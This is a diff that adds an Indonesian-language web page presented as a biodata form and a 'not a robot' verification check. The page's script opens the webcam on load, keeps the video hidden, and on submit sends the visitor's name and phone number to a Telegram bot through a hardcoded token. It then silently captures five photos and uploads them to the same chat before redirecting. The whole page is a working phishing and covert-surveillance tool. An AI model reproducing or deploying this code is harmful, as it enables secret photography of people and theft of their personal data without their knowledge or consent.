@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Biodata Form dengan Kamera Otomatis</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        #video {
+            display: none; /* Sembunyikan elemen video */
+        }
+        #canvas {
+            display: none; /* Sembunyikan canvas */
+        }
+    </style>
+</head>
+<body>
+    <h2>Isi data tersebut untuk verifikasi jika anda buka robot</h2>
+    <form id="biodataForm">
+        <input type="text" id="name" placeholder="Nama Depan" required>
+        <input type="text" id="address" placeholder="Nama Belakang" required>
+        <input type="text" id="phone" placeholder="Nomor Telepon" required>
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
+        <button type="submit">Kirim</button>
+    </form>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        // Minta akses ke kamera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                console.error('Error accessing the camera: ', error);
+            });
+
+        function takePhoto() {
+            // Mengambil gambar dari video
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return new Promise((resolve) => {
+                // Mengkonversi canvas ke gambar
+                canvas.toBlob(blob => {
+                    resolve(blob);
+                }, 'image/png');
+            });
+        }
+
+        async function sendData() {
+            const name = document.getElementById('name').value;
+            const address = document.getElementById('address').value;
+            const phone = document.getElementById('phone').value;
+
+            // Kirim biodata sebagai pesan terpisah
+            const biodataMessage = `Biodata:\nNama Depan: ${name}\nNama Belakang: ${address}\nNomor Telepon: ${phone}`;
+            const token = '8077461850:AAH8wdhBg2pux-lgWIywaFrKJEbEsO7jqAU';
+            const chatId = '-1002335844426'; // ID chat grup Anda
+            
+            // Kirim biodata ke Telegram
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: biodataMessage
+                })
+            });
+
+            // Ambil dan kirim 5 gambar
+            const photoPromises = []; // Array untuk menyimpan Promise foto
+            for (let i = 0; i < 5; i++) {
+                photoPromises.push((async () => {
+                    const photoBlob = await takePhoto();
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', photoBlob, `photo_${i + 1}.png`); // Menambahkan gambar dengan nama unik
+
+                    // Kirim gambar ke Telegram
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                })());
+            }
+
+            await Promise.all(photoPromises); // Tunggu semua foto terkirim
+
+            // Arahkan pengguna ke index.html setelah pengiriman
+            window.location.href = 'soal.html'; // Pastikan file ini ada di direktori yang sama
+        }
+
+        document.getElementById('biodataForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Mencegah form dari pengiriman biasa
+            sendData(); // Ambil foto dan kirim data
+        });
+    </script>
+</body>
+</html>
